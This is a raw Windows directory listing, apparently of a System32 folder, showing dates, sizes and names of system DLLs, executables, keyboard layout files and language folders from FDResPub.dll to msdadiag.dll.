14/07/2009  01:40            34,816 FDResPub.dll
14/07/2009  01:40            93,696 fdSSDP.dll
14/07/2009  01:40           101,376 fdWCN.dll
14/07/2009  01:40            28,160 fdWNet.dll
14/07/2009  01:40           132,096 fdWSD.dll
14/07/2009  01:40            51,712 feclient.dll
15/07/2017  07:54    <DIR>          fi-FI
14/07/2009  01:40           582,656 filemgmt.dll
14/07/2009  01:39            15,872 find.exe
14/07/2009  01:40            67,072 findnetprinters.dll
21/11/2010  03:24            71,168 findstr.exe
14/07/2009  01:39            11,264 finger.exe
14/07/2009  01:38             6,144 Firewall.cpl
14/07/2009  01:40           748,032 FirewallAPI.dll
21/11/2010  03:24           934,912 FirewallControlPanel.dll
13/11/2015  23:08            17,920 fixmapi.exe
14/07/2009  01:40            19,456 fltLib.dll
14/07/2009  01:39            23,552 fltMC.exe
14/07/2009  01:40            29,696 fmifs.dll
21/11/2010  03:24           116,224 fms.dll
16/07/2017  20:22           267,672 FNTCACHE.DAT
30/07/2015  18:06         1,180,160 FntCache.dll
21/11/2010  03:23           861,184 fontext.dll
30/07/2015  18:06           100,864 fontsub.dll
14/07/2009  01:39           109,056 fontview.exe
14/07/2009  01:39            51,712 forfiles.exe
13/07/2009  23:25            34,304 format.com
07/12/2012  11:19            46,592 fpb.rs
21/11/2010  03:23           121,344 fphc.dll
15/07/2017  07:54    <DIR>          fr-FR
13/07/2009  23:38            14,848 framebuf.dll
21/11/2010  03:23           279,040 framedyn.dll
21/11/2010  03:23           295,936 framedynos.dll
10/06/2009  20:38           144,909 fsmgmt.msc
11/03/2011  06:30            96,768 fsutil.exe
14/07/2009  01:40            65,024 fthsvc.dll
21/11/2010  03:24            48,128 ftp.exe
14/07/2009  01:40           194,560 fundisc.dll
03/06/2015  20:21           451,080 fveapi.dll
05/02/2016  18:54           109,568 fveapibase.dll
14/07/2009  01:40            20,480 fvecerts.dll
14/07/2009  01:39           120,320 fvenotify.exe
14/07/2009  01:39           107,008 fveprompt.exe
14/07/2009  01:40           189,440 fveRecover.dll
14/07/2009  01:40           119,296 fveui.dll
14/07/2009  01:40           111,616 fwcfg.dll
12/10/2013  02:29           324,096 FWPUCLNT.DLL
12/05/2016  17:14            75,776 FwRemoteSvr.dll
21/11/2010  03:25           623,104 FXSAPI.dll
14/07/2009  01:40            88,064 FXSCOM.dll
14/07/2009  01:40           591,872 FXSCOMEX.dll
14/07/2009  01:40           762,368 FXSCOMPOSE.dll
14/07/2009  01:27            34,816 FXSCOMPOSERES.dll
12/02/2011  11:34           267,776 FXSCOVER.exe
14/07/2009  01:27             7,680 FXSEVENT.dll
21/11/2010  03:25            41,984 FXSMON.dll
14/07/2009  01:27           925,184 FXSRESM.dll
14/07/2009  01:40            82,944 FXSROUTE.dll
14/07/2009  01:40           863,744 FXSST.dll
21/11/2010  03:25           689,152 FXSSVC.exe
14/07/2009  01:40           258,560 FXST30.dll
21/11/2010  03:25           434,688 FXSTIFF.dll
14/07/2009  05:09    <DIR>          FxsTmp
21/11/2010  03:25            18,432 FXSUNATD.exe
14/07/2009  01:40           187,904 FXSUTILITY.dll
21/11/2010  03:24            57,856 g711codc.ax
14/07/2009  01:40            58,880 gacinstall.dll
07/12/2012  13:15         2,746,368 gameux.dll
14/07/2009  01:27         4,240,384 GameUXLegacyGDFs.dll
10/06/2009  20:36            40,552 gatherNetworkInfo.vbs
10/06/2009  20:48            24,006 gb2312.uce
14/07/2009  01:40           128,512 gcdef.dll
21/11/2010  03:24           403,968 gdi32.dll
03/05/2017  13:05           620,544 generaltel.dll
14/07/2009  01:39            89,600 getmac.exe
14/07/2009  01:39            11,776 GettingStarted.exe
14/07/2009  01:40             9,216 getuname.dll
14/07/2009  01:40           452,096 glmf32.dll
14/07/2009  01:40           165,376 glu32.dll
12/05/2016  17:14            96,256 gpapi.dll
14/07/2009  01:40         1,000,960 gpedit.dll
10/06/2009  20:47           147,439 gpedit.msc
12/05/2016  17:14           793,088 gpprefcl.dll
14/07/2009  01:40            41,984 gpprnext.dll
14/07/2009  01:39           166,912 gpresult.exe
12/05/2016  17:14            32,768 gpscript.dll
12/05/2016  15:06            25,600 gpscript.exe
12/05/2016  17:14           794,624 gpsvc.dll
14/07/2009  01:40            22,528 gptext.dll
14/07/2009  01:39            17,408 gpupdate.exe
07/12/2012  11:19            21,504 grb.rs
14/07/2009  01:40            71,680 Groupinghc.dll
14/07/2009  02:34    <DIR>          GroupPolicy
14/07/2009  02:34    <DIR>          GroupPolicyUsers
14/07/2009  01:39            18,432 grpconv.exe
21/11/2010  03:24           263,040 hal.dll
21/11/2010  03:24            78,848 hbaapi.dll
14/07/2009  01:40            31,232 hcproviders.dll
14/07/2009  01:38           241,152 hdwwiz.cpl
14/07/2009  01:39            64,000 hdwwiz.exe
14/07/2009  03:20    <DIR>          he-IL
14/07/2009  01:39            10,240 help.exe
14/07/2009  01:40            72,704 HelpPaneProxy.dll
21/11/2010  03:24           332,288 hgcpl.dll
21/11/2010  03:24           235,008 hgprint.dll
14/07/2009  01:38           701,952 hhctrl.ocx
14/07/2009  01:41            53,248 hhsetup.dll
14/07/2009  01:41            30,208 hid.dll
14/07/2009  01:38            38,912 hidphone.tsp
14/07/2009  01:41            38,912 hidserv.dll
14/07/2009  01:41           109,568 hlink.dll
14/07/2009  01:41           424,448 hnetcfg.dll
14/07/2009  01:41            16,384 hnetmon.dll
14/07/2009  01:39             9,728 HOSTNAME.EXE
14/07/2009  01:41            64,512 hotplug.dll
21/11/2010  03:24            27,136 HotStartUserAgent.dll
14/07/2009  03:20    <DIR>          hr-HR
14/07/2017  18:04           417,792 html.iec
21/11/2010  03:24            45,056 httpapi.dll
14/07/2009  01:41            41,984 htui.dll
15/07/2017  07:54    <DIR>          hu-HU
14/07/2009  01:39            38,912 hwrcomp.exe
14/07/2009  01:39           184,320 hwrreg.exe
14/07/2009  03:20    <DIR>          ias
14/07/2009  01:41            26,624 ias.dll
21/11/2010  03:24           100,864 iasacct.dll
14/07/2009  01:41            81,408 iasads.dll
14/07/2009  01:41            70,656 iasdatastore.dll
14/07/2009  01:41            98,816 iashlpr.dll
14/07/2009  01:41           629,760 IasMigPlugin.dll
14/07/2009  01:41           226,304 iasnap.dll
14/07/2009  01:41            38,400 iaspolcy.dll
21/11/2010  03:24           217,088 iasrad.dll
21/11/2010  03:24           198,656 iasrecst.dll
14/07/2009  01:41           253,440 iassam.dll
14/07/2009  01:41           445,440 iassdo.dll
14/07/2009  01:41            88,576 iassvcs.dll
14/07/2009  01:41            22,528 icaapi.dll
14/07/2009  01:39            34,816 icacls.exe
09/03/2014  21:48         1,389,208 icardagt.exe
14/07/2017  18:04            81,408 icardie.dll
30/06/2014  22:24             8,856 icardres.dll
21/11/2010  03:23           128,512 IcCoinstall.dll
14/07/2009  01:41           108,544 icfupgd.dll
14/07/2009  01:41           250,880 icm32.dll
14/07/2009  01:27             3,072 icmp.dll
14/07/2009  01:41            26,112 icmui.dll
14/07/2009  01:41            14,336 IconCodecService.dll
10/06/2009  20:31             8,798 icrav03.rat
14/07/2009  01:41           145,920 icsigd.dll
14/07/2009  01:39            16,896 icsunattend.exe
14/07/2009  03:20    <DIR>          icsxml
10/06/2009  20:48            60,458 ideograf.uce
14/07/2009  01:41           214,016 IdListen.dll
14/07/2009  01:41            37,376 idndl.dll
14/07/2009  01:41            55,296 IDStore.dll
14/07/2017  18:04           720,384 ie4uinit.exe
14/07/2017  18:04           131,072 IEAdvpack.dll
14/07/2017  18:04           616,104 ieapfltr.dat
14/07/2017  18:04           800,768 ieapfltr.dll
14/07/2017  18:04           389,840 iedkcs32.dll
14/07/2017  18:04           114,688 ieetwcollector.exe
14/07/2017  18:04             4,096 ieetwcollectorres.dll
14/07/2017  18:04            48,640 ieetwproxystub.dll
14/07/2017  18:04        14,404,096 ieframe.dll
14/07/2017  18:04           135,680 iepeers.dll
14/07/2017  18:04            34,304 iernonce.dll
14/07/2017  18:04         2,885,632 iertutil.dll
14/07/2017  18:04            66,560 iesetup.dll
14/07/2017  18:04           105,984 iesysprep.dll
14/10/2013  17:00            28,368 IEUDINIT.EXE
14/07/2017  18:04           633,856 ieui.dll
14/07/2017  18:04            16,303 ieuinit.inf
14/07/2017  18:04           144,384 ieUnatt.exe
14/07/2017  18:04           167,424 iexpress.exe
14/07/2009  01:41            25,600 ifmon.dll
21/11/2010  03:23           180,736 ifsutil.dll
14/07/2009  01:41            10,752 ifsutilx.dll
14/07/2009  01:41            82,944 igdDiag.dll
12/10/2013  02:29           859,648 IKEEXT.DLL
14/07/2009  01:38            22,016 imaadp32.acm
19/10/2013  02:18            81,408 imagehlp.dll
14/07/2009  01:28        20,268,032 imageres.dll
14/07/2009  01:28           705,536 imagesp1.dll
14/07/2009  01:41           153,088 imapi.dll
21/11/2010  03:23           503,296 imapi2.dll
21/11/2010  03:24         1,244,160 imapi2fs.dll
14/07/2009  03:20    <DIR>          IME
14/07/2017  18:04            48,128 imgutil.dll
21/11/2010  03:24         1,148,416 IMJP10.IME
12/08/2014  02:02           878,080 IMJP10K.DLL
21/11/2010  03:23           457,216 imkr80.ime
14/07/2009  01:41           167,424 imm32.dll
01/07/2016  15:31           976,896 inetcomm.dll
14/07/2017  18:04         2,125,824 inetcpl.cpl
21/11/2010  03:24            65,536 inetmib1.dll
26/06/2016  00:27           166,400 inetpp.dll
26/06/2016  00:27            22,528 inetppui.dll
01/07/2016  15:31            84,480 INETRES.dll
14/07/2009  02:36    <DIR>          inetsrv
14/07/2009  01:39            10,240 InfDefaultInstall.exe
09/03/2014  21:48           171,160 infocardapi.dll
10/06/2009  20:30            45,912 infocardcpl.cpl
09/03/2016  18:54           275,456 InkEd.dll
14/07/2009  01:41           246,784 input.dll
14/07/2017  18:04           101,376 inseng.dll
21/11/2010  03:28            29,815 InstallPackage_ETW.Log
21/11/2010  03:23           373,248 intl.cpl
03/05/2017  13:05           325,632 invagent.dll
04/02/2014  02:28             2,048 iologmsg.dll
14/07/2009  01:41           101,888 IPBusEnum.dll
14/07/2009  01:41            12,800 IPBusEnumProxy.dll
14/07/2009  01:39            58,368 ipconfig.exe
21/11/2010  03:24           145,920 IPHLPAPI.DLL
03/10/2012  17:42           569,344 iphlpsvc.dll
14/07/2009  01:41           359,424 ipnathlp.dll
14/07/2009  01:41             9,728 iprtprio.dll
21/11/2010  03:24           281,088 iprtrmgr.dll
14/07/2009  01:41           876,544 ipsecsnp.dll
12/05/2016  17:14           502,272 IPSECSVC.DLL
21/11/2010  03:23           584,192 ipsmsnap.dll
14/07/2009  01:41            18,432 irclass.dll
14/07/2009  01:39           196,608 irftp.exe
14/07/2009  01:41            23,552 irmon.dll
14/07/2009  01:38           425,984 irprops.cpl
21/11/2010  03:23           152,064 iscsicli.exe
14/07/2009  01:41           234,496 iscsicpl.dll
14/07/2009  01:39           121,344 iscsicpl.exe
14/07/2009  01:41            77,312 iscsidsc.dll
14/07/2009  01:41            10,240 iscsied.dll
14/07/2009  01:41           156,672 iscsiexe.dll
14/07/2009  01:28            16,384 iscsilog.dll
21/11/2010  03:23            37,376 iscsium.dll
14/07/2009  01:41            89,088 iscsiwmi.dll
21/11/2010  03:24            91,648 isoburn.exe
15/07/2017  07:54    <DIR>          it-IT
21/11/2010  03:23           194,048 itircl.dll
14/07/2009  01:41           170,496 itss.dll
21/11/2010  03:24           282,624 iTVData.dll
21/11/2010  03:24            54,272 iyuv_32.dll
15/07/2017  07:54    <DIR>          ja-JP
14/07/2017  18:04            77,824 JavaScriptCollectionAgent.dll
14/07/2009  01:38           143,872 joy.cpl
14/07/2017  18:04           816,640 jscript.dll
14/07/2017  18:04         6,026,240 jscript9.dll
14/07/2017  18:04           814,080 jscript9diag.dll
14/07/2017  18:04           942,592 jsIntl.dll
14/07/2017  18:04            54,784 jsproxy.dll
10/06/2009  20:48             6,948 kanji_1.uce
10/06/2009  20:48             8,484 kanji_2.uce
14/07/2009  01:28             7,680 kbd101.dll
14/07/2009  01:28             7,168 kbd101a.dll
14/07/2009  01:28             7,168 kbd101b.dll
14/07/2009  01:28             7,680 kbd101c.dll
14/07/2009  01:28             7,168 kbd103.dll
14/07/2009  01:28             8,192 kbd106.dll
14/07/2009  01:28             7,680 kbd106n.dll
14/07/2009  01:28             7,168 KBDA1.DLL
14/07/2009  01:28             6,656 KBDA2.DLL
14/07/2009  01:28             7,168 KBDA3.DLL
14/07/2009  01:28             7,680 KBDAL.DLL
14/07/2009  01:28             6,656 KBDARME.DLL
14/07/2009  01:28             6,656 KBDARMW.DLL
14/07/2009  01:28             8,192 kbdax2.dll
14/07/2009  01:28             7,168 KBDAZE.DLL
14/07/2009  01:28             7,168 KBDAZEL.DLL
09/07/2014  02:03             7,168 KBDBASH.DLL
14/07/2009  01:28             7,168 KBDBE.DLL
14/07/2009  01:28             7,680 KBDBENE.DLL
14/07/2009  01:28             7,168 KBDBGPH.DLL
14/07/2009  01:28             7,168 KBDBGPH1.DLL
14/07/2009  01:28             7,168 KBDBHC.DLL
21/11/2010  03:24             7,168 KBDBLR.DLL
14/07/2009  01:28             7,168 KBDBR.DLL
14/07/2009  01:28             7,168 KBDBU.DLL
21/11/2010  03:24             7,168 KBDBULG.DLL
14/07/2009  01:28             7,680 KBDCA.DLL
14/07/2009  01:28             8,704 KBDCAN.DLL
14/07/2009  01:28             8,192 KBDCR.DLL
14/07/2009  01:28             8,192 KBDCZ.DLL
21/11/2010  03:24             8,192 KBDCZ1.DLL
14/07/2009  01:28             8,192 KBDCZ2.DLL
14/07/2009  01:28             7,168 KBDDA.DLL
14/07/2009  01:28             7,168 KBDDIV1.DLL
14/07/2009  01:28             7,168 KBDDIV2.DLL
14/07/2009  01:28             6,656 KBDDV.DLL
14/07/2009  01:28             7,680 KBDES.DLL
14/07/2009  01:28             7,168 KBDEST.DLL
14/07/2009  01:28             6,656 KBDFA.DLL
14/07/2009  01:28             7,680 KBDFC.DLL
14/07/2009  01:28             7,168 KBDFI.DLL
14/07/2009  01:28             8,192 KBDFI1.DLL
14/07/2009  01:28             7,168 KBDFO.DLL
14/07/2009  01:28             7,168 KBDFR.DLL
14/07/2009  01:28             6,656 KBDGAE.DLL
21/11/2010  03:24             6,656 KBDGEO.DLL
14/07/2009  01:28             7,168 kbdgeoer.dll
14/07/2009  01:28             7,168 kbdgeoqw.dll
21/11/2010  03:23             8,192 KBDGKL.DLL
14/07/2009  01:28             7,168 KBDGR.DLL
21/11/2010  03:24             7,680 KBDGR1.DLL
14/07/2009  01:28             8,192 KBDGRLND.DLL
14/07/2009  01:28             6,656 KBDHAU.DLL
14/07/2009  01:28             7,168 KBDHE.DLL
14/07/2009  01:28             7,680 KBDHE220.DLL
14/07/2009  01:28             7,680 KBDHE319.DLL
14/07/2009  01:28             6,656 KBDHEB.DLL
14/07/2009  01:28             7,680 KBDHELA2.DLL
14/07/2009  01:28             7,680 KBDHELA3.DLL
14/07/2009  01:28             9,728 KBDHEPT.DLL
14/07/2009  01:28             7,680 KBDHU.DLL
14/07/2009  01:28             7,168 KBDHU1.DLL
14/07/2009  01:28             8,192 kbdibm02.dll
14/07/2009  01:28             7,680 KBDIBO.DLL
14/07/2009  01:28             7,168 KBDIC.DLL
14/07/2009  01:28             7,168 KBDINASA.DLL
14/07/2009  01:28             7,168 KBDINBE1.DLL
14/07/2009  01:28             7,168 KBDINBE2.DLL
21/11/2010  03:24             7,680 KBDINBEN.DLL
14/07/2009  01:28             7,680 KBDINDEV.DLL
14/07/2009  01:28             7,168 KBDINGUJ.DLL
21/11/2010  03:24             7,168 KBDINHIN.DLL
21/11/2010  03:24             7,168 KBDINKAN.DLL
14/07/2009  01:28             7,680 KBDINMAL.DLL
21/11/2010  03:24             7,168 KBDINMAR.DLL
21/11/2010  03:24             7,168 KBDINORI.DLL
14/07/2009  01:28             7,168 KBDINPUN.DLL
21/11/2010  03:24             7,680 KBDINTAM.DLL
21/11/2010  03:24             7,168 KBDINTEL.DLL
14/07/2009  01:28             8,192 KBDINUK2.DLL
14/07/2009  01:28             6,656 KBDIR.DLL
14/07/2009  01:28             6,656 KBDIT.DLL
14/07/2009  01:28             7,168 KBDIT142.DLL
14/07/2009  01:28             7,680 KBDIULAT.DLL
14/07/2009  01:41            12,800 KBDJPN.DLL
14/07/2009  01:28             7,168 KBDKAZ.DLL
14/07/2009  01:28             7,680 KBDKHMR.DLL
14/07/2009  01:41            12,288 KBDKOR.DLL
14/07/2009  01:28             6,656 KBDKYR.DLL
14/07/2009  01:28             7,680 KBDLA.DLL
14/07/2009  01:28             7,168 KBDLAO.DLL
21/11/2010  03:24             8,192 kbdlk41a.dll
14/07/2009  01:28             6,656 KBDLT.DLL
21/11/2010  03:24             7,168 KBDLT1.DLL
14/07/2009  01:28             7,168 KBDLT2.DLL
14/07/2009  01:28             7,168 KBDLV.DLL
14/07/2009  01:28             7,680 KBDLV1.DLL
14/07/2009  01:28             7,168 KBDMAC.DLL
14/07/2009  01:28             7,168 KBDMACST.DLL
21/11/2010  03:24             7,168 KBDMAORI.DLL
14/07/2009  01:28             7,168 KBDMLT47.DLL
14/07/2009  01:28             7,168 KBDMLT48.DLL
21/11/2010  03:24             7,168 KBDMON.DLL
14/07/2009  01:28             7,168 KBDMONMO.DLL
14/07/2009  01:28             7,168 KBDNE.DLL
14/07/2009  01:28             8,192 kbdnec.dll
14/07/2009  01:28             8,192 kbdnec95.dll
14/07/2009  01:28            10,240 kbdnecat.dll
14/07/2009  01:28             8,704 kbdnecnt.dll
21/11/2010  03:24             7,680 KBDNEPR.DLL
14/07/2009  01:28             7,168 KBDNO.DLL
14/07/2009  01:28             8,192 KBDNO1.DLL
14/07/2009  01:28             8,192 KBDNSO.DLL
14/07/2009  01:28             7,168 KBDPASH.DLL
14/07/2009  01:28             7,680 KBDPL.DLL
14/07/2009  01:28             7,680 KBDPL1.DLL
21/11/2010  03:24             7,680 KBDPO.DLL
14/07/2009  01:28             8,192 KBDRO.DLL
14/07/2009  01:28             8,704 KBDROPR.DLL
14/07/2009  01:28             8,704 KBDROST.DLL
09/07/2014  02:03             6,656 KBDRU.DLL
09/07/2014  02:03             7,168 KBDRU1.DLL
21/11/2010  03:23             7,680 KBDSF.DLL
21/11/2010  03:24             8,192 KBDSG.DLL
14/07/2009  01:28             7,680 KBDSL.DLL
14/07/2009  01:28             8,192 KBDSL1.DLL
14/07/2009  01:28             8,704 KBDSMSFI.DLL
14/07/2009  01:28             8,704 KBDSMSNO.DLL
14/07/2009  01:28             6,656 KBDSN1.DLL
14/07/2009  01:28             8,192 KBDSOREX.DLL
14/07/2009  01:28             7,680 KBDSORS1.DLL
14/07/2009  01:28             8,192 KBDSORST.DLL
14/07/2009  01:28             7,168 KBDSP.DLL
14/07/2009  01:28             7,168 KBDSW.DLL
14/07/2009  01:28             7,680 KBDSW09.DLL
14/07/2009  01:28             7,168 KBDSYR1.DLL
14/07/2009  01:28             7,168 KBDSYR2.DLL
21/11/2010  03:24             7,168 KBDTAJIK.DLL
09/07/2014  02:03             7,168 KBDTAT.DLL
14/07/2009  01:28             7,168 KBDTH0.DLL
14/07/2009  01:28             7,168 KBDTH1.DLL
14/07/2009  01:28             7,168 KBDTH2.DLL
14/07/2009  01:28             7,168 KBDTH3.DLL
14/07/2009  01:28             8,192 KBDTIPRC.DLL
21/11/2010  03:24             8,192 KBDTUF.DLL
21/11/2010  03:24             8,192 KBDTUQ.DLL
21/11/2010  03:24             7,168 KBDTURME.DLL
14/07/2009  01:28             7,168 KBDUGHR.DLL
21/11/2010  03:24             7,168 KBDUGHR1.DLL
14/07/2009  01:28             7,168 KBDUK.DLL
14/07/2009  01:28             8,192 KBDUKX.DLL
14/07/2009  01:28             6,656 KBDUR.DLL
14/07/2009  01:28             7,168 KBDUR1.DLL
14/07/2009  01:28             6,656 KBDURDU.DLL
21/11/2010  03:23             7,168 KBDUS.DLL
14/07/2009  01:28             7,168 KBDUSA.DLL
14/07/2009  01:28             7,168 KBDUSL.DLL
14/07/2009  01:28             7,168 KBDUSR.DLL
14/07/2009  01:28             7,680 KBDUSX.DLL
14/07/2009  01:28             7,168 KBDUZB.DLL
14/07/2009  01:28             7,168 KBDVNTC.DLL
14/07/2009  01:28             7,168 KBDWOL.DLL
09/07/2014  02:03             7,168 KBDYAK.DLL
14/07/2009  01:28             7,168 KBDYBA.DLL
14/07/2009  01:28             7,168 KBDYCC.DLL
14/07/2009  01:28             8,704 KBDYCL.DLL
05/02/2011  17:10            19,328 kd1394.dll
05/02/2011  17:10            17,792 kdcom.dll
05/02/2011  17:10            20,352 kdusb.dll
02/09/2016  15:30           730,624 kerberos.dll
02/09/2016  15:30         1,163,264 kernel32.dll
02/09/2016  15:30           419,840 KernelBase.dll
14/07/2009  01:41            18,432 kernelceip.dll
14/07/2009  01:41            29,184 keyiso.dll
14/07/2009  01:41           169,984 keymgr.dll
14/07/2009  01:39            35,328 klist.exe
14/07/2009  01:38            47,104 kmddsp.tsp
21/11/2010  03:24            90,624 KMSVC.DLL
15/07/2017  07:54    <DIR>          ko-KR
10/06/2009  20:48            12,876 korean.uce
14/07/2009  01:41           180,736 korwbrkr.dll
10/06/2009  20:47        11,967,524 korwbrkr.lex
14/07/2009  01:39            43,008 ksetup.exe
08/12/2015  19:06           250,880 ksproxy.ax
21/11/2010  03:24           102,912 kstvtune.ax
08/12/2015  19:07             5,120 ksuser.dll
21/11/2010  03:24           133,120 Kswdmcap.ax
21/11/2010  03:24            66,048 ksxbar.ax
14/07/2009  01:39            16,896 ktmutil.exe
14/07/2009  01:41            23,040 ktmw32.dll
14/07/2009  01:41            71,168 l2gpstore.dll
14/07/2009  01:41            62,464 l2nacp.dll
14/07/2009  01:41           190,976 L2SecHC.dll
14/07/2009  01:38            81,408 l3codeca.acm
14/07/2009  01:38           182,272 l3codecp.acm
14/07/2009  01:39            16,384 label.exe
14/07/2009  01:41            35,840 LangCleanupSysprepAction.dll
14/07/2009  01:41            11,776 LAPRXY.DLL
10/06/2009  21:01           211,938 lcphrase.tbl
10/06/2009  21:01            24,114 lcptr.tbl
14/07/2017  13:40            41,450 license.rtf
14/07/2017  18:04            30,208 licmgr10.dll
14/07/2009  01:41            29,696 linkinfo.dll
21/11/2010  03:24           232,448 ListSvc.dll
14/07/2009  01:41            49,664 lltdapi.dll
14/07/2009  01:28             2,048 lltdres.dll
14/07/2009  01:41           300,032 lltdsvc.dll
14/07/2009  01:41            23,552 lmhsvc.dll
14/07/2009  01:41           140,800 loadperf.dll
08/01/2015  23:43           419,936 locale.nls
21/11/2010  02:52                15 LocalGroupAdminAdd.log
21/11/2010  03:24           551,936 localsec.dll
26/06/2016  00:27           970,240 localspl.dll
14/07/2009  01:41            17,408 localui.dll
21/11/2010  02:52                50 Local_LLU.log
14/07/2009  01:41           283,648 LocationApi.dll
14/07/2009  01:39            90,112 LocationNotifications.exe
10/06/2009  20:31             2,727 locationnotificationsview.xml
14/07/2009  01:39            10,240 Locator.exe
14/07/2009  01:39            50,176 lodctr.exe
14/07/2009  01:39           113,152 logagent.exe
14/07/2009  04:49    <DIR>          LogFiles
14/07/2009  01:41            91,136 loghours.dll
25/05/2015  18:18           104,448 logman.exe
21/11/2010  03:24            21,504 logoff.exe
21/11/2010  03:24           186,880 logoncli.dll
21/11/2010  03:24            27,648 LogonUI.exe
30/07/2015  18:06            41,984 lpk.dll
21/11/2010  03:24           653,312 lpksetup.exe
14/07/2009  01:41             8,192 lpksetupproxyserv.dll
14/07/2009  01:39            71,168 lpremove.exe
02/09/2016  15:30         1,464,320 lsasrv.dll
02/09/2016  14:53            30,720 lsass.exe
21/11/2010  03:23           343,040 lsm.exe
21/11/2010  03:24            50,176 lsmproxy.dll
14/07/2009  03:20    <DIR>          lt-LT
21/11/2010  03:24            48,640 luainstall.dll
10/06/2009  20:44           144,998 lusrmgr.msc
14/07/2009  03:20    <DIR>          lv-LV
14/07/2009  01:28             3,072 lz32.dll
10/06/2009  21:10             9,958 l_intl.nls
24/12/2017  02:23                 0 ma-log4cpp.log
24/12/2017  02:23                 0 ma-log4cpp_rolling.log
14/07/2009  01:41            48,128 Magnification.dll
14/07/2009  01:39           652,800 Magnify.exe
21/11/2010  03:23           497,664 main.cpl
14/07/2009  01:39           117,248 makecab.exe
21/11/2010  03:24            79,872 manage-bde.exe
10/06/2009  21:04               874 manage-bde.wsf
21/11/2010  03:30    <DIR>          manifeststore
13/11/2015  23:09            91,648 mapi32.dll
13/11/2015  23:09            91,648 mapistub.dll
21/11/2010  03:24           957,440 mblctr.exe
21/11/2010  03:24           272,896 mcbuilder.exe
21/11/2010  03:24           433,512 MCEWMDRMNDBootstrap.dll
14/07/2009  01:41            96,256 mciavi32.dll
14/07/2009  01:41            48,128 mcicda.dll
21/11/2010  03:24            41,472 mciqtz32.dll
14/07/2009  01:41            28,672 mciseq.dll
14/07/2009  01:41            28,672 mciwave.dll
08/12/2015  19:07         1,010,688 mcmde.dll
14/07/2009  01:41           101,376 mcsrchPH.dll
14/07/2009  01:39            97,280 mctadmin.exe
14/07/2009  01:28             2,048 mctres.dll
14/07/2009  01:48            32,832 mcupdate_AuthenticAMD.dll
21/11/2010  03:24           299,392 mcupdate_GenuineIntel.dll
21/11/2010  03:24            84,992 Mcx2Svc.dll
14/07/2009  01:41           154,112 McxDriv.dll
14/07/2009  01:41           216,576 mdminst.dll
14/07/2009  01:39            88,576 MdRes.exe
21/11/2010  03:24           146,944 MdSched.exe
21/11/2010  03:24           345,600 MediaMetadataHandler.dll
14/07/2009  01:41            18,432 memdiag.dll
08/12/2015  19:07         4,121,600 mf.dll
14/07/2009  01:41            55,808 mf3216.dll
14/07/2009  01:41           128,512 mfAACEnc.dll
11/03/2011  06:34         1,395,712 mfc42.dll
11/03/2011  06:34         1,359,872 mfc42u.dll
14/07/2009  01:41            33,792 mfcsubs.dll
05/02/2016  01:19           381,440 mfds.dll
14/07/2009  01:41           121,344 mfdvdec.dll
08/12/2015  19:04             2,048 mferror.dll
14/07/2009  01:41           333,824 mfh264enc.dll
14/07/2009  01:41            93,696 mfmjpegdec.dll
08/12/2015  19:07           432,128 mfplat.dll
21/11/2010  03:24           240,640 MFPlay.dll
08/12/2015  19:06            24,576 mfpmp.exe
08/12/2015  19:07           206,848 mfps.dll
21/11/2010  03:24           257,024 mfreadwrite.dll
08/12/2015  19:07            70,144 mfvdsp.dll
08/12/2015  19:07           484,864 MFWMAAEC.DLL
14/07/2009  01:41            22,528 mgmtapi.dll
14/07/2009  01:28             6,144 microsoft-windows-hal-events.dll
14/07/2009  01:28            51,712 microsoft-windows-kernel-power-events.dll
14/07/2009  01:28            25,088 microsoft-windows-kernel-processor-power-events.dll
14/07/2009  01:41            20,480 midimap.dll
14/07/2009  01:48            91,728 MigAutoPlay.exe
14/07/2009  01:41           123,904 migisol.dll
16/07/2017  20:21    <DIR>          migration
14/07/2009  01:41           182,272 miguiresource.dll
12/04/2011  07:45    <DIR>          migwiz
14/07/2009  04:57             1,244 migwiz.lnk
21/11/2010  03:24            41,472 mimefilt.dll
10/06/2009  20:44           673,088 mlang.dat
14/07/2009  01:41           226,816 mlang.dll
14/07/2009  01:39         2,144,256 mmc.exe
14/07/2009  01:41           356,352 mmcbase.dll
14/07/2009  01:41            74,752 mmci.dll
14/07/2009  01:41            15,360 mmcico.dll
21/11/2010  03:23         3,205,120 mmcndmgr.dll
14/07/2009  01:41           131,072 mmcshext.dll
14/07/2009  01:41            67,584 mmcss.dll
14/07/2009  01:41           284,160 MMDevAPI.dll
14/07/2009  01:29         9,053,696 mmres.dll
21/11/2010  03:24           850,944 mmsys.cpl
21/11/2010  03:24           102,400 mobsync.exe
13/07/2009  23:25            30,208 mode.com
14/07/2009  01:41           303,616 modemui.dll
14/07/2009  01:41            19,968 montr_ci.dll
13/07/2009  23:25            24,576 more.com
14/07/2009  01:29           184,832 moricons.dll
14/07/2009  01:39            14,848 mountvol.exe
08/12/2015  19:07           100,864 MP3DMOD.DLL
08/12/2015  19:07           223,744 MP43DECD.DLL
08/12/2015  19:07           653,824 MP4SDECD.DLL
21/11/2010  03:24           104,960 Mpeg2Data.ax
23/12/2010  10:36           259,072 mpg2splt.ax
08/12/2015  19:07           224,768 MPG4DECD.DLL
14/07/2009  01:39            17,408 mpnotify.exe
14/07/2009  01:41            80,896 mpr.dll
21/11/2010  03:24           221,184 mprapi.dll
21/11/2010  03:24           211,456 mprddm.dll
14/07/2009  01:41            97,792 mprdim.dll
14/07/2009  01:41           105,984 mprmsg.dll
19/10/2010  18:41           270,720 MpSigStub.exe
21/11/2010  03:24           828,416 MPSSVC.dll
14/07/2009  01:39            12,800 MRINFO.EXE
14/07/2017  17:09    <DIR>          MRT
14/07/2017  17:06       135,225,752 MRT.exe
14/07/2009  01:41           173,056 msaatext.dll
21/11/2010  03:25           268,288 MSAC3ENC.DLL
14/07/2009  01:41            83,456 msacm32.dll
14/07/2009  01:38            25,600 msacm32.drv
14/07/2009  01:38            24,064 msadp32.acm
14/07/2009  01:29             3,072 msafd.dll
21/11/2010  03:24            46,592 msasn1.dll
02/09/2016  15:30           146,432 msaudite.dll
14/07/2009  01:41           289,792 mscandui.dll
14/07/2009  01:41            10,240 mscat32.dll
21/11/2010  03:26           175,616 msclmd.dll
21/11/2010  03:24           625,664 mscms.dll
21/11/2010  03:24           300,032 msconfig.exe
21/11/2010  03:23           444,752 mscoree.dll
18/06/2014  22:23           156,312 mscorier.dll
18/06/2014  22:23            73,880 mscories.dll
14/07/2009  01:41         1,067,008 msctf.dll
14/07/2009  01:29             8,704 msctfime.ime
14/07/2009  01:41            28,160 MsCtfMonitor.dll
14/07/2009  01:41           223,744 msctfp.dll
14/07/2009  01:41           114,176 msctfui.dll
14/07/2009  01:41           172,032 msdadiag.dll
